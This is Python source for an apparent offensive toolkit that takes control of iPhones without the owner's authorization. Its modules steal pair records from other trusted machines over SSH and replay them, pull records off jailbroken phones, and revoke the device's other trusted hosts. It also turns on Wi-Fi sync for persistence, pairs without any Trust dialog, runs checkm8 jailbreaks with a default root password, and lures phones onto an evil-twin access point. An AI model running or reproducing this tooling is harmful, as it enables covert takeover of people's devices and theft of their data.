"""Getting control without authorization: the trust-bypass trade.

``preflight``/``ios.up`` answer "what is missing". These modules answer the
sharper question — *whose* authorization is it, and can we get it without the
owner doing anything:

* ``ios.audit`` — score every route against the device, least user
  interaction first, and say which one is open right now.
* ``ios.record`` — harvest, carry and plant the pair record that *is* the
  authorization (a readable plist in an Apple lockdown store); ``steal`` takes
  one off another trusted machine over ssh, ``grab`` lifts the device's own
  copy off a jailbroken phone.
* ``ios.hosts`` — the trust census: which hosts the device still trusts, and
  revoking them (unpair one, or keep only ourselves).
* ``ios.discover`` — ``_apple-mobdev2._tcp`` / lockdownd:62078 discovery, for
  control over the LAN with no cable.
* ``ios.syncwifi`` — flip sync-over-Wi-Fi so the remote channel survives.
* ``ios.remotepair`` — promptless RemotePairing bootstrap over trusted
  lockdownd (no dialog, ever).
* ``ios.pair_supervised`` — pair a supervised device against its keybag, which
  skips the Trust alert entirely.
* ``ios.checkm8`` — the one that needs no trust at all: A5–A11 bootrom exploit
  (root shell, passcode irrelevant, unpatchable in silicon).
* ``ios.ssh`` — that root shell, ``root/alpine`` over the usbmux forward.
* ``ios.heartbeat`` — hold the session open so the trust stays warm.
* ``ios.takeover`` — run the chain, then prove control with real HID input.

Nothing here is destructive; only ``ios.checkm8 RUN=true`` reboots and
jailbreaks.
"""

from __future__ import annotations

import base64
import os
import shutil
import socket
import sys
import time

from omni.core import config, console, platform as host, proc
from omni.core.module import Option
from omni.ios import connect as link
from omni.ios import trust
from omni.ios.device import Ios, IosError
from omni.ios.modules._base import IosModule

__all__ = ["Audit", "Record", "Discover", "SyncWifi", "RemotePair",
           "SupervisedPair", "Bootrom", "Takeover", "Hosts", "Ssh",
           "Heartbeat", "Connect", "Probe", "WifiOnboard"]


def _loot(*parts: str) -> str:
    """Loot path helper: last part is the file name."""
    return os.path.join(config.output_dir(os.path.join("ios", *parts[:-1])),
                        parts[-1])


def _b64(text: str) -> bytes:
    """Decode base64 that may be wrapped across lines; b"" on rubbish."""
    try:
        return base64.b64decode("".join((text or "").split()), validate=False)
    except (ValueError, TypeError):
        return b""


def _ssh_argv(user: str, host: str, port: int, password: str,
              command: str) -> list[str]:
    """ssh argv for a jailed device; sshpass supplies the password if present."""
    argv = ["ssh", "-o", "StrictHostKeyChecking=no", "-o",
            "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
            "-p", str(port)]
    if password:
        argv = (["sshpass", "-p", password] if proc.has("sshpass") else []) + argv
        if not proc.has("sshpass"):
            argv += ["-o", "BatchMode=no"]
    return argv + [f"{user}@{host}", command]


def _prove_control(client) -> tuple[bool, str]:
    """Try one real HID read; returns (ok, detail)."""
    try:
        return True, f"lock state: {client.lock_state()}"
    except IosError as exc:
        return False, str(exc)[:160]
    except Exception as exc:                     # noqa: BLE001
        return False, str(exc)[:160]


def _plant_dirs() -> list[str]:
    """Lockdown stores usbmuxd reads, most authoritative first."""
    return host.lockdown_stores() + [os.path.expanduser("~/.config/lockdown")]


class Audit(IosModule):
    NAME = "ios.audit"
    DESCRIPTION = "Score every no-authorization control route for this device"
    OPTIONS = (Option("UDID", "target UDID"),)

    def execute(self) -> dict:
        state = trust.snapshot(self.client())
        console.kv([("device", state.name or "(unnamed)"),
                    ("model", state.product_type or "?"),
                    ("ios", state.ios or "?"),
                    ("paired", "yes" if state.paired else "no"),
                    ("developer mode", "on" if state.dev_mode else "off"),
                    ("supervised", "yes" if state.supervised else "no"),
                    ("wifi sync", "on" if state.wifi_sync else "off"),
                    ("lan devices", str(state.network_devices)),
                    ("other trusted hosts", str(len(state.other_hosts))),
                    ("jailbroken (sshd)", "yes" if state.jailbroken else "no"),
                    ("records on host", str(len(state.records))),
                    ("escrow bag on host", "yes" if state.escrow else "no")])
        for error in state.errors:
            console.warn(error)
        for host in state.other_hosts:
            console.info(f"trusted host {host} — a record to steal")

        if state.records:
            console.section("pair records found")
            console.table(["udid", "path", "readable", "fields"],
                          [r.row() for r in state.records])
            for record in state.records:
                console.info(f"{os.path.basename(record.path)} buys: "
                             + "; ".join(trust.describe_capabilities(record)))

        routes = trust.assess(state)
        console.section("routes, least interaction first")
        console.table(["interaction", "route", "state / blocker", "command"],
                      [r.row() for r in routes])
        key, interaction = trust.verdict(routes)
        if interaction == "none":
            console.ok(f"controllable without authorization via {key}")
        elif key:
            console.warn(f"cheapest route {key} needs: {interaction}")
        else:
            console.err("no route open — see the blockers above")
        result = trust.serialise(state)
        result["routes"] = [{"key": r.key, "interaction": r.interaction,
                             "applicable": r.applicable} for r in routes]
        result["verdict"] = {"route": key, "interaction": interaction}
        return result


class Record(IosModule):
    NAME = "ios.record"
    DESCRIPTION = "Harvest / carry / plant a pair record (the authorization)"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("ACTION", "scan|export|plant|verify|show|steal|grab",
                      "scan",
                      choices=("scan", "export", "plant", "verify", "show",
                               "steal", "grab"),
                      required=True),
               Option("RECORD", "record file for plant/show"),
               Option("DIR", "lockdown store to plant into"),
               Option("USERHOST", "user@host of another trusted machine"),
               Option("PORT", "ssh port on that machine / the device", "22"),
               Option("PASSWORD", "ssh password (sshpass when installed)"))

    def execute(self) -> dict:
        action = self.get("ACTION")
        if action == "show":
            return self._show()
        if action == "export":
            return self._export()
        if action == "plant":
            return self._plant()
        if action == "steal":
            return self._steal()
        if action == "grab":
            return self._grab()
        if action == "verify":
            return self._verify()
        return self._scan()

    def _scan(self) -> dict:
        dirs = trust.record_dirs()
        records = trust.scan_records(dirs)
        console.info("stores: " + (", ".join(dirs) or "(none)"))
        if not records:
            console.warn("no usable pair record (needs HostPrivateKey)")
            return {"records": [], "stores": dirs}
        console.table(["udid", "path", "readable", "fields"],
                      [r.row() for r in records])
        console.ok(f"{len(records)} record(s) — each one is authorization")
        return {"records": [r.path for r in records], "stores": dirs}

    def _show(self) -> dict:
        path = os.path.expanduser(self.get("RECORD"))
        record = trust.load_record(path) if path else None
        if record is None:
            raise FileNotFoundError(
                f"no usable pair record: {path or '(RECORD unset)'}")
        console.kv([("udid", record.udid), ("host id", record.host_id),
                    ("path", record.path),
                    ("readable", "yes" if record.readable else "no")])
        console.table(["capability"],
                      [[cap] for cap in trust.describe_capabilities(record)])
        return {"udid": record.udid, "fields": list(record.fields)}

    def _export(self) -> dict:
        client = self.client()
        udid = client.udid
        if not udid:
            try:
                udid = str(client.info().get("UniqueDeviceID", ""))
            except Exception:                    # noqa: BLE001 - name only
                udid = ""
        path = os.path.expanduser(
            self.get("RECORD") or _loot("records", f"{udid or 'device'}.plist"))
        client.save_pair_record(path)
        record = trust.load_record(path)
        if record is None or not record.usable:
            raise IosError(f"pymobiledevice3 wrote {path} but it did not "
                           f"parse — is the device actually paired?")
        console.ok(f"record -> {path}")
        console.info("copy it to the attack host, then: "
                     "omni run ios.record ACTION=plant RECORD=<file>")
        return {"path": path, "udid": record.udid,
                "capabilities": trust.describe_capabilities(record)}

    def _steal(self) -> dict:
        """Pull the record off another machine that is still trusted."""
        userhost = self.get("USERHOST")
        if not userhost:
            raise ValueError("STEAL needs USERHOST=user@machine")
        udid = self.get("UDID") or self._udid_hint()
        if not udid:
            raise ValueError("STEAL needs the target UDID (UDID=...)")
        remote = (
            "for p in /var/lib/lockdown /var/db/lockdown "
            f'"$HOME/Library/Lockdown" "C:/ProgramData/Apple/Lockdown"; do '
            f'f="$p/{udid}.plist"; [ -f "$f" ] && base64 "$f" && break; done')
        res = proc.run(_ssh_argv(*self._ssh_target(userhost), remote),
                       timeout=120)
        blob = _b64(res.out)
        target = os.path.expanduser(_loot("records", f"{udid}.plist"))
        if not blob:
            raise IosError(f"no record for {udid} on {userhost}: "
                           f"{res.text.strip()[:200]}")
        with open(target, "wb") as fh:
            fh.write(blob)
        record = trust.load_record(target)
        if record is None or not record.usable:
            raise IosError(f"stole {target} but it does not parse")
        console.ok(f"stole {udid} from {userhost} -> {target}")
        console.table(["capability"],
                      [[cap] for cap in trust.describe_capabilities(record)])
        if self.get_bool("_NO_PLANT"):
            return {"path": target, "udid": udid}
        return self._plant_from(target, udid)

    def _grab(self) -> dict:
        """Read every pair record the *device* holds (jailbroken, over ssh)."""
        userhost = self.get("USERHOST") or "root@127.0.0.1"
        if userhost.endswith("@127.0.0.1") and not self.get("PORT"):
            self.set("PORT", str(trust.USB_SSH_PORT))
        dirs = ("/var/root/Library/Lockdown/pair_records "
                "/var/jb/var/root/Library/Lockdown/pair_records")
        remote = f"tar -cf - {dirs} 2>/dev/null | base64"
        res = proc.run(_ssh_argv(*self._ssh_target(userhost), remote),
                       timeout=180)
        blob = _b64(res.out)
        if not blob:
            raise IosError("no records read — is sshd up "
                           "(iproxy 2222 22) and the device jailed?")
        folder = config.output_dir("ios/records/device")
        archive = os.path.join(folder, "device_records.tar")
        with open(archive, "wb") as fh:
            fh.write(blob)
        proc.run(["tar", "-xf", archive, "-C", folder], timeout=120)
        grabbed = [os.path.join(folder, n) for n in sorted(os.listdir(folder))
                   if n.endswith(".plist")]
        for path in grabbed:
            record = trust.load_record(path)
            if record:
                console.info(f"{os.path.basename(path)} -> host "
                             f"{record.host_id or '?'}: "
                             + ", ".join(trust.describe_capabilities(record)[:2]))
        console.ok(f"{len(grabbed)} record(s) -> {folder}")
        console.info("each one can be planted on another host; escrow bags "
                     "also decrypt that host's backups")
        return {"records": grabbed, "folder": folder}

    def _ssh_target(self, userhost: str) -> tuple[str, str, int, str]:
        user, _, host = userhost.partition("@")
        if not host:
            user, host = "root", user
        return (user, host, max(1, self.get_int("PORT", 22)),
                self.get("PASSWORD"))

    def _udid_hint(self) -> str:
        try:
            return str(self.client().info().get("UniqueDeviceID", ""))
        except Exception:                        # noqa: BLE001 - optional
            return ""

    def _plant_from(self, path: str, udid: str) -> dict:
        target_dir = next((folder for folder in _plant_dirs()
                           if os.path.isdir(folder)), _plant_dirs()[0])
        os.makedirs(target_dir, exist_ok=True)
        shutil.copyfile(path, os.path.join(target_dir, f"{udid}.plist"))
        console.ok(f"planted in {target_dir} — restart usbmuxd/service, "
                   f"replug, then re-run ios.audit")
        return {"path": path, "udid": udid, "planted": target_dir}

    def _plant(self) -> dict:
        source = os.path.expanduser(self.get("RECORD"))
        record = trust.load_record(source) if source else None
        if record is None:
            found = trust.scan_records()
            record = found[0] if found else None
        if record is None:
            raise FileNotFoundError("nothing to plant — pass RECORD=<file>")
        target_dir = os.path.expanduser(self.get("DIR") or "") or next(
            (folder for folder in _plant_dirs() if os.path.isdir(folder)), "")
        if not target_dir:
            raise IosError("no lockdown store on this host; create one and "
                           "pass DIR=")
        os.makedirs(target_dir, exist_ok=True)
        target = os.path.join(target_dir, f"{record.udid}.plist")
        shutil.copyfile(record.path, target)
        if os.name != "nt":
            try:
                os.chmod(target, 0o644)
            except OSError:
                pass
        console.ok(f"planted {record.udid} -> {target}")
        hint = " ".join(host.service_restart()[0])
        console.info(f"run '{hint}', replug, and the phone answers with no "
                     f"Trust prompt")
        if self.get_bool("_NO_VERIFY"):
            return {"planted": target}
        return self._verify(udid=record.udid, planted=target)

    def _verify(self, udid: str = "", planted: str = "") -> dict:
        client = Ios(udid=self.get("UDID") or udid or None)
        try:
            info = client.info()
        except Exception as exc:                 # noqa: BLE001
            console.warn(f"cannot verify yet: {str(exc)[:120]}")
            return {"paired": False, "planted": planted,
                    "error": str(exc)[:200]}
        name = info.get("DeviceName", "?")
        console.ok(f"lockdown reachable with no prompt on {name} — "
                   f"next: omni run ios.up")
        return {"paired": True, "device": name, "planted": planted}


def _port_open(host: str, port: int = trust.LOCKDOWN_PORT,
               timeout: float = 1.5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


class Discover(IosModule):
    NAME = "ios.discover"
    DESCRIPTION = "Find iPhones on the LAN (mobdev2/62078) — no cable needed"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("SECONDS", "how long to browse bonjour", "8"),
               Option("HOSTS", "comma-separated extra hosts to probe"),
               Option("PROBE", "TCP-probe lockdownd on every hit", "true",
                      choices=("true", "false")))

    def execute(self) -> dict:
        client = Ios(udid=self.get("UDID") or None)
        if not client.have_pmd3():
            raise IosError("pymobiledevice3 missing — browsing needs it")
        seconds = max(1, min(120, self.get_int("SECONDS", 8)))
        args = ["bonjour", "mobdev2", "--timeout", str(seconds)]
        pair_dir = next((d for d in trust.record_dirs()
                         if trust.scan_records([d])), "")
        if pair_dir:
            args += ["--pair-records", pair_dir]
        console.info(f"browsing {trust.MOBDEV2_SERVICE} for {seconds}s"
                     + (f" (validating against {pair_dir})" if pair_dir
                        else " (no pair record — names only)"))
        res = client.raw(*args, timeout=seconds + 20)
        devices = trust.parse_bonjour(res.text)

        rows = []
        for device in devices:
            host = (device.get("host") or device.get("ip")
                    or device.get("hostname") or "")
            port = device.get("port", str(trust.LOCKDOWN_PORT))
            if host and self.get_bool("PROBE", True):
                reachable = "yes" if _port_open(host, int(port)) else "no"
            else:
                reachable = "skipped"
            rows.append([device.get("udid", "?"), host or "?", port,
                         reachable])
        for host in [h.strip() for h in (self.get("HOSTS") or "").split(",")
                     if h.strip()]:
            rows.append(["(probe)", host, str(trust.LOCKDOWN_PORT),
                         "yes" if _port_open(host) else "no"])

        if not rows:
            console.warn("nothing found — Wi-Fi sync must be on "
                         "(ios.syncwifi ACTION=on) and both ends on the same "
                         "L2 network")
            return {"devices": [], "service": trust.MOBDEV2_SERVICE}
        console.table(["udid", "host", "port", "reachable"], rows)
        console.ok(f"{len(rows)} candidate(s) — drive one with UDID=<udid> "
                   f"once a record is planted")
        return {"devices": rows, "service": trust.MOBDEV2_SERVICE,
                "output": res.text.strip()[-400:]}


class SyncWifi(IosModule):
    NAME = "ios.syncwifi"
    DESCRIPTION = "Read or flip sync-over-Wi-Fi (keeps the channel alive)"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("ACTION", "get|on|off", "get",
                      choices=("get", "on", "off"), required=True))

    def execute(self) -> dict:
        client = self.client()
        action = self.get("ACTION")
        if action == "get":
            state = trust.parse_wifi_state(client.wifi_connections())
            console.info("wifi sync: " + ("on" if state else "off"))
            return {"enabled": state}
        client.wifi_connections(action)
        state = trust.parse_wifi_state(client.wifi_connections())
        console.ok(f"wifi sync set {action} (now {'on' if state else 'off'})")
        if state:
            console.info("with a planted record this survives cable pulls; "
                         "find the device with: omni run ios.discover")
        return {"enabled": state}


class RemotePair(IosModule):
    NAME = "ios.remotepair"
    DESCRIPTION = "Bootstrap RemotePairing promptlessly over trusted lockdown"
    OPTIONS = (Option("UDID", "target UDID"),)

    def execute(self) -> dict:
        client = self.client()
        if not client.is_paired():
            raise IosError("lockdownd is not trusted yet — nothing to pair "
                           "against (plant a record or run ios.pair)")
        out = client.remotepairing(pair=True)
        console.ok("RemotePairing record written — no Trust dialog was shown")
        endpoints = trust.parse_bonjour(out)
        if endpoints:
            console.table(["udid", "host", "port"],
                          [[e.get("udid", "?"), e.get("host", "?"),
                            e.get("port", "?")] for e in endpoints])
        console.info("open a tunnel with 'pymobiledevice3 remote "
                     "start-tunnel' (root) for RSD services")
        return {"paired": True, "endpoints": endpoints,
                "output": out.strip()[-400:]}


class SupervisedPair(IosModule):
    NAME = "ios.pair_supervised"
    DESCRIPTION = "Pair a supervised device via its keybag (no Trust alert)"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("KEYBAG", "supervision keybag plist", "",
                      required=True))

    def execute(self) -> dict:
        client = self.client()
        keybag = os.path.expanduser(self.get("KEYBAG"))
        if not os.path.isfile(keybag):
            raise FileNotFoundError(f"no such keybag: {keybag}")
        if client.is_paired():
            console.info("already paired — nothing to do")
            return {"paired": True}
        client.pair_supervised(keybag)
        console.ok("paired against the supervision identity — no dialog")
        return {"paired": True, "keybag": keybag}


class Bootrom(IosModule):
    NAME = "ios.checkm8"
    DESCRIPTION = "Checkm8/bootrom route: root shell, trust irrelevant"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("RUN", "invoke the jailbreak tool too", "false",
                      choices=("true", "false")),
               Option("TOOL", "auto|palera1n|checkra1n", "auto",
                      choices=("auto", "palera1n", "checkra1n")),
               Option("ARGS", "extra arguments for the tool"))

    def execute(self) -> dict:
        client = self.client()
        info = client.info()
        product = str(info.get("ProductType", ""))
        ios = str(info.get("ProductVersion", ""))
        status, soc = trust.checkm8_status(product)
        console.kv([("model", product or "?"), ("ios", ios or "?"),
                    ("soc", soc or "?"), ("bootrom", status)])
        if status != "vulnerable":
            console.warn("not checkm8-vulnerable — A12 and later fixed it in "
                         "silicon; use the trust/pair routes instead")
            return {"bootrom": status, "soc": soc}
        console.ok(f"{soc} carries checkm8 — unpatchable, runs below the OS, "
                   f"the passcode is irrelevant")
        tool = self._tool()
        if not tool:
            console.warn("neither palera1n nor checkra1n installed — install "
                         "one first")
            return {"bootrom": status, "soc": soc, "tool": ""}
        console.info("jailbreak with: " + " ".join(self._argv(tool)))
        if not self.get_bool("RUN", False):
            return {"bootrom": status, "soc": soc, "tool": tool}
        console.warn("the device drops to DFU and reboots; this takes a while")
        res = proc.run(self._argv(tool), timeout=1800)
        if not res.ok:
            raise IosError(f"{tool} failed: {res.text[-300:]}")
        console.ok("jailbreak finished — root shell over SSH (root/alpine)")
        return {"bootrom": status, "soc": soc, "tool": tool,
                "output": res.text[-400:]}

    def _tool(self) -> str:
        wanted = self.get("TOOL")
        if wanted != "auto":
            return wanted if proc.has(wanted) else ""
        return next((cand for cand in ("palera1n", "checkra1n")
                     if proc.has(cand)), "")

    def _argv(self, tool: str) -> list[str]:
        argv = [tool]
        if tool == "palera1n":
            argv += ["-f", "-c"]              # rootful, then leave SSH up
        elif tool == "checkra1n":
            argv += ["-c"]
        if self.get("ARGS"):
            argv += self.get("ARGS").split()
        return host.root_argv(argv)


class Takeover(IosModule):
    NAME = "ios.takeover"
    DESCRIPTION = "Run the cheapest no-authorization route, then prove control"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("AUTO", "apply the cheapest applicable route", "true",
                      choices=("true", "false")),
               Option("RECORD", "pair record to plant instead of searching"))

    def execute(self) -> dict:
        client = self.client()
        state = trust.snapshot(client)
        routes = trust.assess(state)
        key, interaction = trust.verdict(routes)
        if not key:
            raise IosError("no route open — see ios.audit for the blockers")
        route = next(r for r in routes if r.key == key)
        console.kv([("device", state.name or "(unnamed)"),
                    ("route", f"{route.title} ({route.interaction})"),
                    ("impact", route.impact)])
        applied = ""
        if self.get_bool("AUTO", True) and interaction != "jailbreak":
            applied = self._apply(client, route)
        ok, detail = _prove_control(client)
        if ok:
            console.ok(f"control proven — {detail}")
        else:
            console.warn(f"not controllable yet: {detail}")
            if route.command:
                console.warn(f"next step ({interaction}): {route.command}")
        return {"route": key, "interaction": interaction, "applied": applied,
                "controlled": ok, "detail": detail}

    def _apply(self, client, route: trust.Route) -> str:
        """Execute one route; returns what was actually done."""
        try:
            if route.key == "record-replay":
                record = (trust.load_record(os.path.expanduser(
                    self.get("RECORD"))) if self.get("RECORD")
                    else (trust.scan_records() or [None])[0])
                if record is None:
                    return "no record to plant"
                target_dir = next((folder for folder in _plant_dirs()
                                   if os.path.isdir(folder)),
                                  _plant_dirs()[0])
                os.makedirs(target_dir, exist_ok=True)
                shutil.copyfile(record.path,
                                os.path.join(target_dir,
                                             f"{record.udid}.plist"))
                console.ok(f"record {record.udid} planted in {target_dir}")
                console.warn("restart usbmuxd/the Apple service, replug, "
                             "then re-run")
                return "planted record"
            if route.key == "wifi-sync":
                client.wifi_connections("on")
                console.ok("wifi sync on")
                return "wifi sync on"
            if route.key == "remotepairing":
                client.remotepairing(pair=True)
                console.ok("RemotePairing bootstrapped promptlessly")
                return "remotepairing"
            if route.key == "devmode-host":
                res = client.run("amfi", "enable-developer-mode", timeout=180)
                console.ok("developer mode flipped — a reboot may be needed")
                return "developer mode" if res.ok else "developer mode (check)"
        except Exception as exc:                 # noqa: BLE001 - keep going
            console.warn(f"{route.key} failed: {str(exc)[:140]}")
            return f"failed: {str(exc)[:120]}"
        return ""


class Hosts(IosModule):
    NAME = "ios.hosts"
    DESCRIPTION = "List or revoke the hosts this device trusts (a trust census)"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("ACTION", "list|unpair|keep-only", "list",
                      choices=("list", "unpair", "keep-only"),
                      required=True),
               Option("HOSTID", "host id to unpair"))

    def execute(self) -> dict:
        client = self.client()
        hosts = trust.parse_host_ids(client.trusted_hosts())
        ours = client.run("lockdown", "get", "com.apple.mobile.lockdown",
                          "HostID", timeout=60)
        our_id = (trust.parse_host_ids(ours.out) or [""])[0]
        if not hosts:
            console.warn("device reports no paired hosts (or the key is "
                         "hidden)")
            return {"hosts": [], "ours": our_id}
        console.table(["#", "host id", "role"],
                      [[str(i), host, "this host" if host.lower() ==
                        our_id.lower() else "other"]
                       for i, host in enumerate(hosts, 1)])
        console.info("each 'other' row is a machine holding a copy of the "
                     "authorization — ios.record ACTION=steal takes one")

        action = self.get("ACTION")
        if action == "list":
            return {"hosts": hosts, "ours": our_id}
        targets = [self.get("HOSTID")] if self.get("HOSTID") else \
            [h for h in hosts if h.lower() != our_id.lower()]
        if action == "keep-only":
            if not our_id:
                raise IosError("could not read our own host id")
            targets = [h for h in hosts if h.lower() != our_id.lower()]
        for host in targets:
            client.unpair(host)
            console.ok(f"unpaired {host}")
        if not targets:
            console.info("nothing to revoke")
        return {"hosts": hosts, "revoked": targets}


class Ssh(IosModule):
    NAME = "ios.ssh"
    DESCRIPTION = "Run a command as root on a jailed device (root/alpine)"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("CMD", "shell command to run", "id", required=True),
               Option("USERHOST", "override target", "root@127.0.0.1"),
               Option("PORT", "ssh port (usbmux forward)", "2222"),
               Option("PASSWORD", "root password", "alpine"))

    def execute(self) -> dict:
        user, _, host = self.get("USERHOST").partition("@")
        argv = _ssh_argv(user or "root", host or "127.0.0.1",
                         max(1, self.get_int("PORT", 2222)),
                         self.get("PASSWORD"), self.get("CMD"))
        console.info(" ".join(argv[:1] + argv[-2:]))
        res = proc.run(argv, timeout=300)
        if not res.ok:
            raise IosError(
                f"ssh failed: {res.text.strip()[:200] or 'exit ' + str(res.code)}"
                "  (start 'iproxy 2222 22' and confirm the device is jailed)")
        for line in res.out.splitlines():
            console.info(line)
        return {"command": self.get("CMD"), "output": res.out.strip()[-2000:]}


class Connect(IosModule):
    NAME = "ios.connect"
    DESCRIPTION = "Connect with no passcode: probe, pair, and prove it works"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("HOST", "LAN address to probe first"),
               Option("PROMPTLESS", "pair and wait for the tap", "true",
                      choices=("true", "false")),
               Option("WAIT", "seconds to wait for the tap", "25"),
               Option("KEYBAG", "supervision keybag for a no-dialog pair"),
               Option("SAVE", "remember the device for later commands", "true",
                      choices=("true", "false")))

    def execute(self) -> dict:
        if self.get("HOST") and not _port_open(self.get("HOST")):
            console.warn(f"{self.get('HOST')}:{trust.LOCKDOWN_PORT} is closed "
                         f"— put the phone on this network first "
                         f"(omni run ios.wifi_onboard)")
        client = Ios(udid=self.get("UDID") or None)
        if not client.have_pmd3():
            raise IosError("pymobiledevice3 missing — see install.sh")

        if self.get("KEYBAG"):
            report = self._pair_supervised(client)
        else:
            report = link.connect(client, promptless=self.get_bool(
                "PROMPTLESS", True), wait=self.get_int("WAIT", 25))

        console.table(["step", "state", "detail"], report.rows())
        console.section("verdict")
        console.info(link.verdict(report))
        if report.state == "ok":
            console.ok("no password and no passcode were used")
            self._remember(client)
        elif report.state == "untrusted":
            console.info("next: steal a record (ios.record ACTION=steal) or "
                         "ios.pair_supervised KEYBAG=<kb> when supervised")
        elif report.state == "no-device":
            console.info("next: omni run ios.wifi_onboard, or use the cable")
        return {"state": report.state, "connected": report.connected,
                "rows": report.rows()}

    def _pair_supervised(self, client) -> link.Report:
        """Pair against a supervision keybag — the only zero-tap pairing."""
        keybag = os.path.expanduser(self.get("KEYBAG"))
        if not os.path.isfile(keybag):
            raise FileNotFoundError(f"no such keybag: {keybag}")
        report = link.Report()
        report.add("device visible", "ok", "supervised pair requested")
        client.pair_supervised(keybag)
        report.add("pair-supervised", "ok", "no dialog")
        probe = client.run("lockdown", "info", timeout=60)
        report.add("pair-verify",
                   "ok" if probe.ok else link.classify(probe.text),
                   "device answered" if probe.ok else probe.text.strip()[:100])
        return report

    def _remember(self, client) -> None:
        if not self.get_bool("SAVE", True):
            return
        udid = client.udid
        if not udid:
            try:
                udid = str(client.info().get("UniqueDeviceID", ""))
            except Exception:                    # noqa: BLE001 - optional
                udid = ""
        if udid:
            config.set_value("ios.udid", udid)
            console.info(f"saved ios.udid={udid} — later commands skip UDID=")


class Probe(IosModule):
    NAME = "ios.probe"
    DESCRIPTION = "Read-only ladder: visible, untrusted, dialog or trusted?"
    OPTIONS = (Option("UDID", "target UDID"),)

    def execute(self) -> dict:
        report = link.ladder(self.client())
        console.table(["step", "state", "detail"], report.rows())
        (console.ok if report.state == "ok" else console.warn)(
            link.verdict(report))
        return {"state": report.state, "connected": report.connected,
                "attempts": [[a.step, a.state, a.detail]
                             for a in report.attempts]}


class Heartbeat(IosModule):

    NAME = "ios.heartbeat"
    DESCRIPTION = "Hold the trusted session open (keeps Wi-Fi/usbmux warm)"
    OPTIONS = (Option("UDID", "target UDID"),
               Option("SECONDS", "how long to hold it", "30"))

    def execute(self) -> dict:
        client = self.client()
        seconds = max(3, self.get_int("SECONDS", 30))
        console.info(f"holding the session for {seconds}s")
        alive = client.heartbeat(seconds)
        if alive:
            console.ok("session held — the trust record stays warm")
        else:
            console.warn("heartbeat exited early; check ios.audit for blockers")
        return {"held": alive, "seconds": seconds}


class WifiOnboard(IosModule):
    NAME = "ios.wifi_onboard"
    DESCRIPTION = "Get the phone onto this network, then connect over the LAN"
    OPTIONS = (Option("SSID", "known network to clone (evil twin)"),
               Option("RUN", "start wifi.eviltwin", "false",
                      choices=("true", "false")),
               Option("SECONDS", "settle time after starting it", "25"),
               Option("UDID", "target UDID"))

    def execute(self) -> dict:
        client = Ios(udid=self.get("UDID") or None)
        if not client.have_pmd3():
            raise IosError("pymobiledevice3 missing — see install.sh")
        visible = link.reach(client)
        if any(transport == "Network" for transport, _ in visible):
            console.ok("already reachable over the LAN — run ios.connect")
            return {"lan": True, "devices": visible}
        if any(transport == "USB" for transport, _ in visible):
            console.info("USB only so far — sync-over-Wi-Fi has to be on "
                         "before it appears on the LAN: omni run ios.syncwifi "
                         "ACTION=on")

        ssid = self.get("SSID")
        found: list[dict] = []
        if ssid and self.get_bool("RUN", False):
            argv = [sys.executable, "-m", "omni.cli", "run", "wifi.eviltwin",
                    f"SSID={ssid}"]
            console.info(" ".join(argv) + "   (needs root + a monitor iface)")
            proc.spawn(argv)
            time.sleep(max(5, self.get_int("SECONDS", 25)))
            found = trust.parse_bonjour(client.raw(
                "bonjour", "mobdev2", "--timeout", "10", timeout=40).text)
            console.table(["udid", "host", "port"],
                          [[d.get("udid", "?"), d.get("host", "?"),
                            d.get("port", "?")] for d in found]
                          or [["-", "-", "-"]])
            if not found:
                console.warn("no advertisement yet — the phone joins a known "
                             "SSID on its own schedule; keep waiting or widen "
                             "the deauth")
        else:
            console.info("chain: omni run wifi.scan  →  omni run "
                         "wifi.eviltwin SSID=<their network> RUN=true  →  "
                         "omni run ios.connect")
            console.info("an iPhone auto-joins a network it already knows, so "
                         "cloning a known SSID lands it on your AP with no "
                         "password prompt")
        return {"lan": False, "ssid": ssid, "found": found}
